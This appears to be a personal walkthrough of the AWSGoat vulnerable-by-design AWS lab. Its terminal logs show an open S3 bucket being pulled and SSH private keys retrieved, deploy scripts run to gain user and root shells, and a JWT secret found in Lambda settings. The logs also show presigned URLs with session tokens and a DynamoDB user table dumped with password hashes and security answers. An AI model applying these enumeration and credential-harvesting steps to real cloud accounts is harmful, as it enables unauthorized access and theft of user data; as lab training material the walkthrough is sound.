# Module 1
### List S3 buckets
````
┌──(kali㉿kali)-[~]
└─$ aws s3 ls                                                             
2023-10-11 10:41:38 dev-blog-awsgoat-bucket-315333988455
2023-10-11 10:41:37 do-not-delete-awsgoat-state-files-315333988455
2023-09-28 11:32:40 inebucketlou
2023-09-25 09:36:20 mynonvulnerablebucket
2023-09-25 09:35:21 myvulnerablebucket
2023-10-11 10:41:37 production-blog-awsgoat-bucket-315333988455
````
### Download S3 Bucket
````
┌──(kali㉿kali)-[~]
└─$ aws s3 sync s3://dev-blog-awsgoat-bucket-315333988455/ . --region us-east-1 --no-sign-request
warning: Skipping file /home/kali/.mozilla/firefox/xtu1la9j.default-esr/lock. File does not exist.
warning: Skipping file /home/kali/Labs/AWSGoat/module1/shared/scripts/.ssh. File/Directory is not readable.
download: s3://dev-blog-awsgoat-bucket-315333988455/asset-manifest.json to ./asset-manifest.json
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/alice.pem to shared/files/.ssh/keys/alice.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/bob.pem to shared/files/.ssh/keys/bob.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/VincentVanGoat.pub to shared/files/.ssh/keys/VincentVanGoat.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/manifest.json to ./manifest.json
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/VincentVanGoat.pem to shared/files/.ssh/keys/VincentVanGoat.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/alice.pub to shared/files/.ssh/keys/alice.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/index.html to ./index.html
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/config.txt to shared/files/.ssh/config.txt
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/charles.pem to shared/files/.ssh/keys/charles.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/mary.pem to shared/files/.ssh/keys/mary.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/charles.pub to shared/files/.ssh/keys/charles.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/bob.pub to shared/files/.ssh/keys/bob.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/mary.pub to shared/files/.ssh/keys/mary.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/mike.pub to shared/files/.ssh/keys/mike.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/john.pem to shared/files/.ssh/keys/john.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/mike.pem to shared/files/.ssh/keys/mike.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/scripts/deploy_node.sh to shared/scripts/deploy_node.sh
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/john.pub to shared/files/.ssh/keys/john.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/scripts/php-deploy.sh to shared/scripts/php-deploy.sh
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/sophia.pub to shared/files/.ssh/keys/sophia.pub
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/scripts/wordpress_deploy.sh to shared/scripts/wordpress_deploy.sh
download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/sophia.pem to shared/files/.ssh/keys/sophia.pem
download: s3://dev-blog-awsgoat-bucket-315333988455/static/js/787.8c65ad62.chunk.js.map to static/js/787.8c65ad62.chunk.js.map
download: s3://dev-blog-awsgoat-bucket-315333988455/static/js/787.8c65ad62.chunk.js to static/js/787.8c65ad62.chunk.js
````
### User pwned
````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
└─$ cd shared      
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1/shared]
└─$ cd scripts 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ ls
deploy_node.sh  php-deploy.sh  wordpress_deploy.sh
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ sh deploy_node.sh                     
[sudo] password for kali: 
info: Adding user `bob' ...
info: Selecting UID/GID from range 1000 to 59999 ...
info: Adding new group `bob' (1001) ...
info: Adding new user `bob' (1001) with group `bob (1001)' ...
info: Creating home directory `/home/bob' ...
info: Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for bob
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] 
info: Adding new user `bob' to supplemental / extra groups `users' ...
info: Adding user `bob' to group `users' ...
┌──(bob㉿kali)-[~]
└─$ whoami                                                                                                                                                                                                                                  
bob

````
### Root pwned
````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
└─$ cd shared 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1/shared]
└─$ cd scripts  
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ ls
deploy_node.sh  php-deploy.sh  wordpress_deploy.sh
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ sh wordpress_deploy.sh 
┌──(root㉿kali)-[/home/…/AWSGoat/module1/shared/scripts]
└─# whoami
root
````
### Keys of users
````
──(kali㉿kali)-[~/…/module1/shared/files/.ssh]
└─$ ls
config.txt  keys
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/module1/shared/files/.ssh]
└─$ cat config.txt 
Host 10.25.14.6
  HostName alice
  Port 22
  IdentityFile /shared/files/.ssh/keys/alice.pem
  User alice
  
Host 34.207.133.229
  HostName bob
  Port 22
  IdentityFile /shared/files/.ssh/keys/bob.pem
  User bob

Host 184.73.142.5
  HostName VincentVanGoat
  Port 22
  IdentityFile /shared/files/.ssh/keys/VincentVanGoat.pem
  User VincentVanGoat

Host 10.25.14.106
  HostName charles
  Port 22
  IdentityFile /shared/files/.ssh/keys/charles.pem
  User charles

Host 172.16.84.59
  HostName john
  Port 22
  IdentityFile /shared/files/.ssh/keys/john.pem
  User john

Host 172.16.87.25
  HostName mary
  Port 22
  IdentityFile /shared/files/.ssh/keys/mary.pem
  User mary

Host 172.22.26.8
  HostName mike
  Port 22
  IdentityFile /shared/files/.ssh/keys/mike.pem
  User mike

Host 10.0.48.71
  HostName sophia
  Port 22
  IdentityFile /shared/files/.ssh/keys/sophia.pem
  User sophia                                   
````

## Lambda

````
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ aws lambda list-functions --region us-east-1
{
    "Functions": [
        {
            "FunctionName": "blog-application-data",
            "FunctionArn": "arn:aws:lambda:us-east-1:315333988455:function:blog-application-data",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::315333988455:role/blog_app_lambda_data",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 5622,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 256,
            "LastModified": "2023-10-11T09:42:05.396+0000",
            "CodeSha256": "Fv+wneeKLjHQ/l2vFh4RagWabMWrfrGYS2JWKXAH3JQ=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "JWT_SECRET": "T2BYL6#]zc>Byuzu"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "8bc046a5-1d69-4927-af67-8d2fef80bee2",
            "Layers": [
                {
                    "Arn": "arn:aws:lambda:us-east-1:315333988455:layer:bcrypt-pyjwt:1",
                    "CodeSize": 958331
                }
            ],
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        },
        {
            "FunctionName": "blog-application",
            "FunctionArn": "arn:aws:lambda:us-east-1:315333988455:function:blog-application",
            "Runtime": "nodejs14.x",
            "Role": "arn:aws:iam::315333988455:role/blog_app_lambda",
            "Handler": "index.handler",
            "CodeSize": 416087,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-10-11T09:42:24.184+0000",
            "CodeSha256": "Rg+u4EXXP+oOnvXNgLjnm/ZH1fVbOfCjNa/k4Qy37XA=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "8945f303-0759-4f25-9a84-b5ef7af95ba4",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
````
### Found JWT Secret:

            "Environment": {
                "Variables": {
                    "JWT_SECRET": "T2BYL6#]zc>Byuzu"
                }
            },
            
### Get Function blog-application
````
┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
└─$ aws lambda get-function --function-name blog-application --region us-east-1
{
    "Configuration": {
        "FunctionName": "blog-application",
        "FunctionArn": "arn:aws:lambda:us-east-1:315333988455:function:blog-application",
        "Runtime": "nodejs14.x",
        "Role": "arn:aws:iam::315333988455:role/blog_app_lambda",
        "Handler": "index.handler",
        "CodeSize": 416087,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2023-10-11T09:42:24.184+0000",
        "CodeSha256": "Rg+u4EXXP+oOnvXNgLjnm/ZH1fVbOfCjNa/k4Qy37XA=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "8945f303-0759-4f25-9a84-b5ef7af95ba4",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "SnapStart": {
            "ApplyOn": "None",
            "OptimizationStatus": "Off"
        },
        "RuntimeVersionConfig": {
            "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:6bb36f9b9d5441744b635fb38a7ec2ff2e3f880e8961af488cd3d98429398e3d"
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/315333988455/blog-application-183e9251-3bcb-490b-99c0-8f0e191f6830?versionId=FflJ6Ih.SY4nXYty2Pjr0Bowd3YZs34I&X-Amz-Security-Token=IQoJb3JpZ2luX2Vj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQC4uELszJQehS4JnAOOd66scq6s5mFOx02OyXo3eGNczgIhAMuz%2BGLRsHxkOywdJuDi5RCux8Jj%2FJr%2Bg03kJNkFO4JxKroFCO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNzQ5Njc4OTAyODM5IgwjB4dY8WPGXrYyjfAqjE8xzXeQ908mlJ%2F3t9M8ByDQHTKgdV7b7EG2ZrniUg7MSRFxMYCuyqNYY1ZgCgrZA0Wt512FSWRHSuFed4wnxcX8rN0OHUh1k1iYqA2TMiEfFZEVWdvM1DWavru2Z6R1ko9ieMI6zrRKfgw2%2Brn5KNs8k12fXnljOoDKECLJCdJAL2K0c5k0Kur1E0MFYJU38QJBC2HS775AJFnaIGM9LMe0lSd3SHVXsVa6MgxjmHnMCJkM1XEk2TKeK2FIBb%2Fn29SNLfsmoMPSjMLeJfSRTedJqCthhyH8f7YMYb0S4LxZEecaZLgXhETWYbU38UcrFrxrmyMijasV%2BWk74Ol63foWxVpCoTqLJnyKiaaSwYKKKYHqa9gwM8aPOOBMJobvAX8ug9c7onlDhWuh186iLZyJHO0mwN9KgCx3d2E0jwgn1dfij9csFI6zSQ8OlWnrcfZotNxuUydilTyiinN4hvro56i7KcTEFajnrFc0v%2BrjpTH2zqIwfNQ0gBJ3PK2KG6FDsVNuNp5ReKMkYE0%2FlVZ5kqCFWUCucHJMOqJTSVEdPKFVevRU9uhqF7feWe9V2wTnnqUNkjvdHEewrNEJj8fmzlLqr4JoPwyrX6Rdpv%2FhZOL2PZL8jR8gd7Gpml1w9T48HPAsbEWfTPP3LciqprhpvHJ6P13XnkWp83AGqokmJgbGbs0MTXg576XdU5EzIByhk7HQb3qZxlINuidRLGHVUGc3PfjpbzeA%2BgRMQ90JPn4e7qGjoaODVjXqs451NbqHmX7IUMfjR5TxESKQbi%2BaLeh%2F%2FeLVcupnceAsfyvDHkH8%2BOT%2BojTdWCaPUUQtpIbuQdCBxsCbl2Mh2GMyKj%2F8LSbHy%2Fow3aGaqQY6sAHRRN%2BFqi3KRVspiBvdDQG%2nkR8F29qhouIBKqLyUw%2BFolFjSJ4xef3u5RYkozLWirDabLrNQGvC%2BEyaqTOyNeQnc9BNxAX2wOU%2Ftvu6QjIAW5KIBKhCvSehFw4g7I2VutpBtG2VrA6l2X%2FHd9k8lbmh%2BSHIF2XrCOZ%2BPWGlqvWhWXdqbhdNixfEEG4fJDmil1hNfAL0fzZhHUpsC8Ux8QRNabwhj5tHE4QSrl4hLuQ%3D%3D&Xz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20231011T135620Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY3ZZGUDEOX%2F20231011%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=2aa0009a65311e0fdf59327339d62bcb48c0c915416c76481aa4464376883"
    }
}
````
### Get Function blog-application-data
This will gives us a zip file containing a python file
````
{
    "Configuration": {
        "FunctionName": "blog-application-data",
        "FunctionArn": "arn:aws:lambda:us-east-1:315333988455:function:blog-application-data",
        "Runtime": "python3.9",
        "Role": "arn:aws:iam::315333988455:role/blog_app_lambda_data",
        "Handler": "lambda_function.lambda_handler",
        "CodeSize": 5622,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 256,
        "LastModified": "2023-10-11T09:42:05.396+0000",
        "CodeSha256": "Fv+wneeKLjHQ/l2vFh4RagWabMWrfrGYS2JWKXAH3JQ=",
        "Version": "$LATEST",
        "Environment": {
            "Variables": {
                "JWT_SECRET": "T2BYL6#]zc>Byuzu"
            }
        },
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "8bc046a5-1d69-4927-af67-8d2fef80bee2",
        "Layers": [
            {
                "Arn": "arn:aws:lambda:us-east-1:315333988455:layer:bcrypt-pyjwt:1",
                "CodeSize": 958331
            }
        ],
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "SnapStart": {
            "ApplyOn": "None",
            "OptimizationStatus": "Off"
        },
        "RuntimeVersionConfig": {
            "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:65d8a55e7d094cdfca79c506263a99c166ff4afba537e80b4eec2eb9568f7ba6"
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/315333988455/blog-application-data-a418de47-27c6-4469-84df-374a7d84beaf?versionId=A8D8F2KXRyeT6EUIKwb064SXdUhpSyGL&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQCXx2WKvCbvFodeJBT5qfFOe1y%2BAE1AVKnkJDUHONCl7gIhAM8pg8diV2vbeWEDZdoNTpzg6sn8O8V0pB0rWOczren6KroFCO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNzQ5Njc4OTAyODM5Igwu%2BLlfqlz8xMUJ82oqjgV28n6y6ST5k1j8zmw6oaZ8kf4twggzOIZbkhpTKGJwgqf%2BLGbzM53H1dvcPx60racZQDqlYACDo%2F%2Fo%2FqQVyTFmPcbdNsD%2BzTbVElkM9b%2FusE81vttjvs8IybgsqcTUpeiwOYh3lZG3X2Hn4%2BUV6FMzokFj26e3ANVLSQIcqcr8DgpOe7cTx1pG%2FE68zIdNwxQ7lH5UD7KL6QG3ohty8z46TcJBhNftIUGxKCWIO0SVD8HHqL6stNlTB5S71%2B5DoeNsFDP1iowj5Pz%2BtHXo8geV%2B7TFn5HH5WFDN4ty%2BGERVozPUsgPaxRudrr2uQRRuuzQJNHJabD22naZPv31IsDOcMs9vmp4mqw8xutpsQlPma3OqMSCu9A2aKWcNuUZVSWLZuOxvJrx1bg1nm30BtT2VnLjY707P9zQUy0QhiTa9rwCnkVdeb0eRLspV%2FtAzQBMVR8wsS80JQYzHYUSNvq31or4GhYBuIOIZoZIE1sg2j%2BF8Y0X%2Bq5cr7GP3TE73wVuKM9Mrp%2FF%2BaYU9O22%2BEgjXjXN0PaYuy7ez18ghoPKkH2OtCfplJV8WwDjJMQReGiYapk8bDotXQI0DE5EdVwQ78Q7aiZ2cW9BQGT6NrrVXu1sXMLs%2BZAWRpHb3nMUV673tAft0a8BaAILKKaHFazrLDs1u5V3taKduXLmDTHwAVo5BllGZ9z5vKleWjoUPwdwxzlid1zD8OkiPh65Ghb6EQMHdlAD%2Bsnb5Zb4Lne3V9fxszbtsoG4va3fefOL%2F9HdG8OL0%2F9BWkOoUyOREPs6DXY42wDwD3EGcD%2FizC48D%2Fh3myszOZBLC%2FLSmvV5INSpjqI9PaXD%2BjsJGMh%2FIuofwtCgI7wwJ4Z%2FfpBclpcwrceaqQY6sAF6mLLpJZNn%2BrO8u1qDdVzd8sDs2Qf2ra7XfN5aNsklsNFWaHnpHZmXYF2y1C4umbigigXvhsua2q%2BUTRiGH3j1b%2BZzRFwaxPNKwvnpbDM7egblHy8JEoiwj4hJCY2HMB8Vffjx6wPx4xYk8O2Ifw2llIjPEAt%2Fen78xQjzpDsVSc%2B2NoBJKbmEOxzkX%2BnlvLWo6nLHupLRe236lKq1fA72TBDVZrUbsONc%2FuuAzWSNqg%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20231011T140111Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY3ZU6Q2JGJ%2F20231011%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=697621cd4a8ad2b891f6230423e10a140d9093f0a25a2236fbe94e3b9ad20013"
    }
}
````
## Testing API Gateway

### Get APIs

````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
└─$ aws apigateway get-rest-apis --region us-east-1
{
    "items": [
        {
            "id": "j4nbgp3ssj",
            "name": "blog-application",
            "createdDate": "2023-10-11T10:41:41+01:00",
            "apiKeySource": "HEADER",
            "endpointConfiguration": {
                "types": [
                    "REGIONAL"
                ]
            },
            "disableExecuteApiEndpoint": false
        },
        {
            "id": "uklmns71xk",
            "name": "blog-application-api",
            "createdDate": "2023-10-11T10:41:36+01:00",
            "apiKeySource": "HEADER",
            "endpointConfiguration": {
                "types": [
                    "REGIONAL"
                ]
            },
            "disableExecuteApiEndpoint": false
        }
    ]
}
````

### Get Resources from APIs

````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
└─$ aws apigateway get-resources --rest-api-id uklmns71xk --region us-east-1
{
    "items": [
        {
            "id": "09tmbm",
            "parentId": "sdtw1na2qa",
            "pathPart": "login",
            "path": "/login",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "1z2wgh",
            "parentId": "sdtw1na2qa",
            "pathPart": "ban-user",
            "path": "/ban-user",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "2okpqe",
            "parentId": "sdtw1na2qa",
            "pathPart": "change-profile",
            "path": "/change-profile",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "36qlrh",
            "parentId": "sdtw1na2qa",
            "pathPart": "unban-user",
            "path": "/unban-user",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "3ze9li",
            "parentId": "sdtw1na2qa",
            "pathPart": "register",
            "path": "/register",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "4dc0f6",
            "parentId": "sdtw1na2qa",
            "pathPart": "search-author",
            "path": "/search-author",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "5rqhcw",
            "parentId": "sdtw1na2qa",
            "pathPart": "xss",
            "path": "/xss",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "5v5vi2",
            "parentId": "sdtw1na2qa",
            "pathPart": "list-posts",
            "path": "/list-posts",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "5y7rs1",
            "parentId": "sdtw1na2qa",
            "pathPart": "change-auth",
            "path": "/change-auth",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "6kab1r",
            "parentId": "sdtw1na2qa",
            "pathPart": "user-details-modal",
            "path": "/user-details-modal",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "b9rfza",
            "parentId": "sdtw1na2qa",
            "pathPart": "dump",
            "path": "/dump",
            "resourceMethods": {
                "GET": {},
                "OPTIONS": {}
            }
        },
        {
            "id": "d6q274",
            "parentId": "sdtw1na2qa",
            "pathPart": "delete-user",
            "path": "/delete-user",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "ey2dr4",
            "parentId": "sdtw1na2qa",
            "pathPart": "get-users",
            "path": "/get-users",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "hrpzgx",
            "parentId": "sdtw1na2qa",
            "pathPart": "save-post",
            "path": "/save-post",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "j0qezv",
            "parentId": "sdtw1na2qa",
            "pathPart": "modify-post-status",
            "path": "/modify-post-status",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "m6ofkh",
            "parentId": "sdtw1na2qa",
            "pathPart": "verify",
            "path": "/verify",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "pdpdnt",
            "parentId": "sdtw1na2qa",
            "pathPart": "reset-password",
            "path": "/reset-password",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "sdtw1na2qa",
            "path": "/"
        },
        {
            "id": "xld58w",
            "parentId": "sdtw1na2qa",
            "pathPart": "save-content",
            "path": "/save-content",
            "resourceMethods": {
                "GET": {},
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "y1k27e",
            "parentId": "sdtw1na2qa",
            "pathPart": "get-dashboard",
            "path": "/get-dashboard",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "z0xsif",
            "parentId": "sdtw1na2qa",
            "pathPart": "change-password",
            "path": "/change-password",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        }
    ]
}
        {
            "id": "m6ofkh",
            "parentId": "sdtw1na2qa",
            "pathPart": "verify",
            "path": "/verify",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "pdpdnt",
            "parentId": "sdtw1na2qa",
            "pathPart": "reset-password",
            "path": "/reset-password",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "sdtw1na2qa",
            "path": "/"
        },
        {
            "id": "xld58w",
            "parentId": "sdtw1na2qa",
            "pathPart": "save-content",
            "path": "/save-content",
            "resourceMethods": {
                "GET": {},
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "y1k27e",
            "parentId": "sdtw1na2qa",
            "pathPart": "get-dashboard",
            "path": "/get-dashboard",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        },
        {
            "id": "z0xsif",
            "parentId": "sdtw1na2qa",
            "pathPart": "change-password",
            "path": "/change-password",
            "resourceMethods": {
                "OPTIONS": {},
                "POST": {}
            }
        }
    ]
}
(END)
                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
aws apigateway get-resources --rest-api-id j4nbgp3ssj --region us-east-1
{
    "items": [
        {
            "id": "hbak8i",
            "parentId": "t32626u4b2",
            "pathPart": "react",
            "path": "/react",
            "resourceMethods": {
                "GET": {}
            }
        },
        {
            "id": "t32626u4b2",
            "path": "/"
        }
    ]
}
````
## DynamoDB
### List Tables
````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
aws dynamodb list-tables --region us-east-1                 
{
    "TableNames": [
        "blog-posts",
        "blog-users"
    ]
}
````
### Scan Tables
````
┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
└─$ aws dynamodb scan --table-name blog-users --region us-east-1
{
    "Items": [
        {
            "secretQuestion": {
                "S": "What is your favourite sport?"
            },
            "creationDate": {
                "S": "2023-10-11T09:55:03.926Z"
            },
            "address": {
                "S": "rua nsadnsnad  asnd nsad "
            },
            "secretAnswer": {
                "S": "Ballet"
            },
            "email": {
                "S": "lourenco@g.com"
            },
            "country": {
                "S": "Portugal"
            },
            "name": {
                "S": "lourenco"
            },
            "authLevel": {
                "S": "200"
            },
            "password": {
                "S": "$2b$10$D0L6jfDlM9s384C6r3Mj/eXU7dR0dozRljvGI3WFTJ0M30vY8WQve"
            },
            "username": {
                "S": "lou"
            },
            "id": {
                "S": "8"
            },
            "userStatus": {
                "S": "active"
            },
            "phone": {
                "S": "943324324"
            }
        },
        {
            "secretQuestion": {
                "S": "At what age did you first interacted with a computer?"
            },
            "creationDate": {
                "S": "2022-04-04T00:00:00.000Z"
            },
            "address": {
                "S": "Ap #434-4703 Erat St."
            },
            "secretAnswer": {
                "S": "8"
            },
            "email": {
                "S": "interdum.curabit@aol.com"
            },
            "country": {
                "S": "Mexico"
            },
            "name": {
                "S": "Caryn Barr"
            },
            "authLevel": {
                "S": "200"
            },
            "password": {
                "S": "$2a$10$aUxnhrJEfoB1GDfqx8YF/uDgmbTJ/eJuzmnWgLeXjKV.maPOC4k2G"
            },
            "username": {
                "S": "carynbarr"
            },
            "id": {
                "S": "2"
            },
            "userStatus": {
                "S": "active"
            },
            "phone": {
                "S": "0712376412"
            }
        },
        {
            "secretQuestion": {
                "S": "Where is your hometown?"
            },
            "creationDate": {
                "S": "2022-02-06T00:00:00.000Z"
            },
            "address": {
                "S": "964-8243 Ipsum St."
            },
            "secretAnswer": {
                "S": "Huabii"
            },
            "email": {
                "S": "orci.adipiscing@google.com"
            },
            "country": {
                "S": "Netherlands"
            },
            "name": {
                "S": "Quinn Baird"
            },
            "authLevel": {
                "S": "200"
            },
            "password": {
                "S": "$2a$10$6W4Vejfi55j0N3.7M1hXaemU9d4VTzh4cyks.ae9p5Ygiq77q4Ai2"
            },
            "username": {
                "S": "quinnbaird"
            },
            "id": {
                "S": "5"
            },
            "userStatus": {
                "S": "banned"
            },
            "phone": {
                "S": "0617783305"
            }
        },
        {
            "secretQuestion": {
                "S": "What is your favourite colour?"
            },
            "creationDate": {
                "S": "2022-03-08T00:00:00.000Z"
            },
            "address": {
                "S": "5823 Velit St."
            },
            "secretAnswer": {
                "S": "Lamp"
            },
            "email": {
                "S": "tempor@icloud.net"
            },
            "country": {
                "S": "South Africa"
            },
            "name": {
                "S": "Prescott Hensley"
            },
            "authLevel": {
                "S": "200"
            },
            "password": {
                "S": "$2a$10$na.4xDXxaFiX0J0PDje20eGo3pHzHNElP.PiTF6wrctkTv9vmmYZG"
            },
            "username": {
                "S": "prescotthensley"
            },
            "id": {
                "S": "3"
            },
            "userStatus": {
                "S": "active"
            },
            "phone": {
                "S": "0848627138"
            }
        },
        {
            "secretQuestion": {
                "S": "What is your favourite sport?"
            },
            "creationDate": {
                "S": "2022-04-12T00:00:00.000Z"
            },
            "address": {
                "S": "Ap #497-8828 Dolor. Street"
            },
            "secretAnswer": {
                "S": "Cricket"
            },
            "email": {
                "S": "phasellus@aol.ca"
            },
            "country": {
                "S": "New Zealand"
            },
            "name": {
                "S": "Connor Cantrell"
            },
            "authLevel": {
                "S": "100"
            },
            "password": {
                "S": "$2a$10$5mB1SoNKWMVgFJCQXMfjB.0dWWOwujv5HFNOI6cDNyXq0p4R2k2WG"
            },
            "username": {
                "S": "conorcantrell"
            },
            "id": {
                "S": "7"
            },
            "userStatus": {
                "S": "active"
            },
            "phone": {
                "S": "0788887134"
            }
        },
        {
            "secretQuestion": {
                "S": "At what age did you first interacted with a computer?"
            },
            "creationDate": {
                "S": "2022-05-12T00:00:00.000Z"
            },
            "address": {
                "S": "Ap #434-4703 Erat St."
            },
            "secretAnswer": {
                "S": "7"
            },
            "email": {
                "S": "interdum.curabitur@aol.com"
            },
            "country": {
                "S": "Mexico"
            },
            "name": {
                "S": "Raja Bauer"
            },
            "authLevel": {
                "S": "200"
            },
            "password": {
                "S": "$2a$10$DqZ2OS0AVflfWsK6W5YR2eKro8Eq5gQKFYAvO2h52S0umsWEYTvYu"
            },
            "username": {
                "S": "rajabauer"
            },
            "id": {
                "S": "6"
            },
            "userStatus": {
                "S": "active"
            },
            "phone": {
                "S": "0712376712"
            }
        },
        {
            "secretQuestion": {
                "S": "What is your first pet's name?"
            },
            "creationDate": {
                "S": "2022-04-12T00:00:00.000Z"
            },
            "address": {
                "S": "P.O. Box 959, 723 Lobortis St."
            },
            "secretAnswer": {
                "S": "Tiger"
            },
            "email": {
